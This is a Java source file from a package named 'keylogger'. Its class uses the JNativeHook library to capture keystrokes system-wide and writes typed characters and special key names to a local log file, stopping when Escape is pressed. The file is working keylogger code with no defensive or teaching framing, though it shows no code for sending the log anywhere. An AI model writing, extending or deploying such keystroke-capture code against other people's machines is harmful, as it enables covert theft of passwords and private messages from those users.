package com.keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;

public class GlobalKeyListener implements NativeKeyListener{
    private final ConfigLogger loger;
    public GlobalKeyListener() throws IOException {
        this.loger = new ConfigLogger("Logg_file.txt");
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String speicalKeys = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (speicalKeys.length() > 1 ){
            loger.writeFile(speicalKeys);
        }
        // Exits the program
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException nativeHookException) {
                nativeHookException.printStackTrace();
            }
        }
    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        String letter = String.valueOf(e.getKeyChar());
        if (letter.matches("^[a-zA-Z0-9!@#$&()\\-`.+,/\"]*$")){
            loger.writeFile(letter);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }
}
